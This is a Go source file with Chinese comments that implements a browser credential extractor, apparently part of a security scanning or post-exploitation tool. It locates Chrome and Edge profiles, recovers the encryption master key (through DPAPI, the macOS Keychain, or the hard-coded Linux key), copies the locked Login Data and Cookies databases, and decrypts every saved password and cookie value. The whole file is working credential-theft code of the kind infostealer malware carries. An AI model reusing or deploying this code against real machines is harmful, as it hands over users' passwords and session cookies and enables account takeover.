package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"unicode/utf8"
)

// ==================== 浏览器凭据提取 ====================
//
// 提取 Chromium 系浏览器（Chrome / Edge）保存的密码与 Cookie。
// 所有错误均降级处理：浏览器不存在、数据库锁定、解密失败时只是少返回，
// 绝不 panic 或中断扫描。

// BrowserCred 浏览器保存的登录凭据
type BrowserCred struct {
	Browser  string
	Profile  string
	URL      string
	Username string
	Password string
}

// BrowserCookie 浏览器保存的 Cookie
type BrowserCookie struct {
	Browser  string
	Profile  string
	Host     string
	Name     string
	Value    string
}

// errAppBound 表示 Chrome 127+ 的 v20 App-Bound 加密，无法离线解密
var errAppBound = errors.New("v20 app-bound encrypted, skipped")

// browserDef 描述一个受支持的浏览器
type browserDef struct {
	name         string // 展示名
	userDataDir  string // User Data 根目录
	safeStorage  string // macOS Keychain service 名
}

// supportedBrowsers 返回当前平台上可能存在的浏览器数据目录
func supportedBrowsers() []browserDef {
	var defs []browserDef
	switch runtime.GOOS {
	case "windows":
		local := os.Getenv("LOCALAPPDATA")
		if local == "" {
			return nil
		}
		defs = []browserDef{
			{name: "Chrome", userDataDir: filepath.Join(local, `Google\Chrome\User Data`)},
			{name: "Edge", userDataDir: filepath.Join(local, `Microsoft\Edge\User Data`)},
		}
	case "darwin":
		home, err := os.UserHomeDir()
		if err != nil {
			return nil
		}
		as := filepath.Join(home, "Library", "Application Support")
		defs = []browserDef{
			{name: "Chrome", userDataDir: filepath.Join(as, "Google", "Chrome"), safeStorage: "Chrome Safe Storage"},
			{name: "Edge", userDataDir: filepath.Join(as, "Microsoft Edge"), safeStorage: "Microsoft Edge Safe Storage"},
		}
	case "linux":
		home, err := os.UserHomeDir()
		if err != nil {
			return nil
		}
		cfg := filepath.Join(home, ".config")
		defs = []browserDef{
			{name: "Chrome", userDataDir: filepath.Join(cfg, "google-chrome")},
			{name: "Edge", userDataDir: filepath.Join(cfg, "microsoft-edge")},
		}
	}
	// 只保留实际存在的目录
	var out []browserDef
	for _, d := range defs {
		if st, err := os.Stat(d.userDataDir); err == nil && st.IsDir() {
			out = append(out, d)
		}
	}
	return out
}

// ExtractBrowserCredentials 提取本机 Chrome/Edge 保存的密码和 Cookie。
// 密码与 Cookie 值原样返回，调用方负责掩码显示。
// 任何单个浏览器/条目失败都不会导致整体失败。
func ExtractBrowserCredentials() ([]BrowserCred, []BrowserCookie, error) {
	var creds []BrowserCred
	var cookies []BrowserCookie

	for _, b := range supportedBrowsers() {
		key, err := resolveMasterKey(b)
		if err != nil || len(key) == 0 {
			continue // 主密钥拿不到就跳过整个浏览器
		}
		for _, profile := range findProfiles(b.userDataDir) {
			profileName := filepath.Base(profile)

			loginDB := filepath.Join(profile, "Login Data")
			if fileExists(loginDB) {
				creds = append(creds, extractLogins(loginDB, b.name, profileName, key)...)
			}

			// Chrome 96+ Cookie 在 Network 子目录
			cookieDB := filepath.Join(profile, "Network", "Cookies")
			if !fileExists(cookieDB) {
				cookieDB = filepath.Join(profile, "Cookies")
			}
			if fileExists(cookieDB) {
				cookies = append(cookies, extractCookies(cookieDB, b.name, profileName, key)...)
			}
		}
	}
	return creds, cookies, nil
}

// findProfiles 返回 User Data 下的所有 profile 目录（Default + Profile N）
func findProfiles(userDataDir string) []string {
	var profiles []string
	if st, err := os.Stat(filepath.Join(userDataDir, "Default")); err == nil && st.IsDir() {
		profiles = append(profiles, filepath.Join(userDataDir, "Default"))
	}
	entries, err := os.ReadDir(userDataDir)
	if err != nil {
		return profiles
	}
	for _, e := range entries {
		if e.IsDir() && strings.HasPrefix(e.Name(), "Profile ") {
			profiles = append(profiles, filepath.Join(userDataDir, e.Name()))
		}
	}
	return profiles
}

func fileExists(p string) bool {
	st, err := os.Stat(p)
	return err == nil && !st.IsDir()
}

// resolveMasterKey 按平台解出 AES 主密钥
func resolveMasterKey(b browserDef) ([]byte, error) {
	switch runtime.GOOS {
	case "windows":
		// Local State 里的 os_crypt.encrypted_key 是 DPAPI 保护的主密钥
		raw, err := readEncryptedKey(filepath.Join(b.userDataDir, "Local State"))
		if err != nil {
			return nil, err
		}
		return dpapiDecrypt(raw) // browser_creds_windows.go
	case "darwin":
		// Safe Storage 密码存于 Keychain，PBKDF2 派生 AES 密钥
		pw, err := safeStoragePassword(b.safeStorage) // browser_creds_unix.go
		if err != nil {
			return nil, err
		}
		return pbkdf2SHA1([]byte(pw), []byte("saltysalt"), 1003, 16), nil
	case "linux":
		// 老格式：硬编码密码 'peanuts'，迭代 1 次
		return pbkdf2SHA1([]byte("peanuts"), []byte("saltysalt"), 1, 16), nil
	default:
		return nil, errors.New("unsupported platform")
	}
}

// readEncryptedKey 从 Local State JSON 中取出 os_crypt.encrypted_key，
// base64 解码并去掉 "DPAPI" 前缀
func readEncryptedKey(localStatePath string) ([]byte, error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, err
	}
	var state struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, err
	}
	if state.OSCrypt.EncryptedKey == "" {
		return nil, errors.New("no encrypted_key in Local State")
	}
	raw, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if len(raw) <= 5 || string(raw[:5]) != "DPAPI" {
		return nil, errors.New("unexpected encrypted_key format")
	}
	return raw[5:], nil
}

// copyToTemp 把浏览器数据库复制到临时目录（浏览器运行时持有锁，直接打开会失败）。
// 返回临时副本路径和清理函数。
func copyToTemp(src string) (string, func(), error) {
	in, err := os.Open(src)
	if err != nil {
		return "", nil, err
	}
	defer in.Close()

	tmp, err := os.CreateTemp("", "xunfeng-browser-*.db")
	if err != nil {
		return "", nil, err
	}
	cleanup := func() {
		tmp.Close()
		os.Remove(tmp.Name())
	}
	if _, err := io.Copy(tmp, in); err != nil {
		cleanup()
		return "", nil, err
	}
	if err := tmp.Sync(); err != nil {
		cleanup()
		return "", nil, err
	}
	return tmp.Name(), cleanup, nil
}

// extractLogins 从 Login Data 数据库提取保存的密码
func extractLogins(dbPath, browser, profile string, key []byte) []BrowserCred {
	tmp, cleanup, err := copyToTemp(dbPath)
	if err != nil {
		return nil
	}
	defer cleanup()

	db, err := openSQLiteDB(tmp)
	if err != nil {
		return nil
	}
	defer db.Close()

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins`)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var out []BrowserCred
	for rows.Next() {
		var url, username string
		var encPass []byte
		if rows.Scan(&url, &username, &encPass) != nil {
			continue
		}
		pass, err := decryptBrowserValue(key, encPass)
		if err != nil {
			continue // v20 App-Bound 或解密失败，跳过该条
		}
		out = append(out, BrowserCred{
			Browser:  browser,
			Profile:  profile,
			URL:      url,
			Username: username,
			Password: pass,
		})
	}
	return out
}

// extractCookies 从 Cookies 数据库提取 Cookie 值
func extractCookies(dbPath, browser, profile string, key []byte) []BrowserCookie {
	tmp, cleanup, err := copyToTemp(dbPath)
	if err != nil {
		return nil
	}
	defer cleanup()

	db, err := openSQLiteDB(tmp)
	if err != nil {
		return nil
	}
	defer db.Close()

	rows, err := db.Query(`SELECT host_key, name, encrypted_value FROM cookies`)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var out []BrowserCookie
	for rows.Next() {
		var host, name string
		var encVal []byte
		if rows.Scan(&host, &name, &encVal) != nil {
			continue
		}
		val, err := decryptBrowserValue(key, encVal)
		if err != nil {
			continue
		}
		// Chrome 80+ 的 GCM Cookie 明文前 32 字节是 host_key 的 SHA-256 校验值
		if len(val) > 32 && !utf8.ValidString(val) {
			if stripped := val[32:]; utf8.ValidString(stripped) {
				val = stripped
			}
		}
		out = append(out, BrowserCookie{
			Browser: browser,
			Profile: profile,
			Host:    host,
			Name:    name,
			Value:   val,
		})
	}
	return out
}

// decryptBrowserValue 解密单条 password_value / encrypted_value。
// v10/v11 = 3 字节前缀 + 12 字节 nonce + AES-GCM 密文（Windows 主密钥 32 字节，
// macOS/Linux 派生密钥 16 字节时回退到 AES-128-CBC 老格式）。
// v20 是 Chrome 127+ 的 App-Bound 加密，离线无法解密，返回 errAppBound。
func decryptBrowserValue(key, data []byte) (string, error) {
	if len(key) != 16 && len(key) != 32 {
		return "", errors.New("bad key length")
	}
	if len(data) < 3 {
		return "", errors.New("value too short")
	}

	switch string(data[:3]) {
	case "v10", "v11":
		// 先试 AES-GCM
		if pt, err := gcmDecrypt(key, data[3:]); err == nil {
			return string(pt), nil
		}
		// macOS / Linux 老格式：AES-128-CBC，IV 为 16 字节空格，PKCS7 填充
		if len(key) == 16 {
			return cbcDecrypt(key, data[3:])
		}
		return "", errors.New("gcm decrypt failed")
	case "v20":
		return "", errAppBound
	default:
		// Linux 未启用 keyring 时可能存明文
		if utf8.Valid(data) {
			return string(data), nil
		}
		return "", errors.New("unknown value format")
	}
}

// gcmDecrypt 解析 12 字节 nonce + AES-GCM 密文
func gcmDecrypt(key, data []byte) ([]byte, error) {
	if len(data) < 12+16 {
		return nil, errors.New("gcm payload too short")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return gcm.Open(nil, data[:12], data[12:], nil)
}

// cbcDecrypt 解密老格式 AES-128-CBC（IV 固定为 16 个 0x20 空格）并去 PKCS7 填充
func cbcDecrypt(key, data []byte) (string, error) {
	if len(data) == 0 || len(data)%aes.BlockSize != 0 {
		return "", errors.New("bad cbc payload")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	iv := []byte("                ") // 16 spaces
	pt := make([]byte, len(data))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(pt, data)
	// PKCS7 unpad
	pad := int(pt[len(pt)-1])
	if pad < 1 || pad > aes.BlockSize || pad > len(pt) {
		return "", errors.New("bad padding")
	}
	for _, b := range pt[len(pt)-pad:] {
		if int(b) != pad {
			return "", errors.New("bad padding")
		}
	}
	pt = pt[:len(pt)-pad]
	if !utf8.Valid(pt) {
		return "", errors.New("not utf8")
	}
	return string(pt), nil
}

// pbkdf2SHA1 是 PBKDF2-HMAC-SHA1 的最小实现（避免引入 golang.org/x/crypto）
func pbkdf2SHA1(password, salt []byte, iter, keyLen int) []byte {
	prf := hmac.New(sha1.New, password)
	hashLen := prf.Size()
	numBlocks := (keyLen + hashLen - 1) / hashLen

	var dk []byte
	var blockBuf [4]byte
	for block := 1; block <= numBlocks; block++ {
		prf.Reset()
		prf.Write(salt)
		binary.BigEndian.PutUint32(blockBuf[:], uint32(block))
		prf.Write(blockBuf[:])
		u := prf.Sum(nil)

		t := make([]byte, hashLen)
		copy(t, u)
		for i := 1; i < iter; i++ {
			prf.Reset()
			prf.Write(u)
			u = prf.Sum(nil)
			for j := range t {
				t[j] ^= u[j]
			}
		}
		dk = append(dk, t...)
	}
	return dk[:keyLen]
}
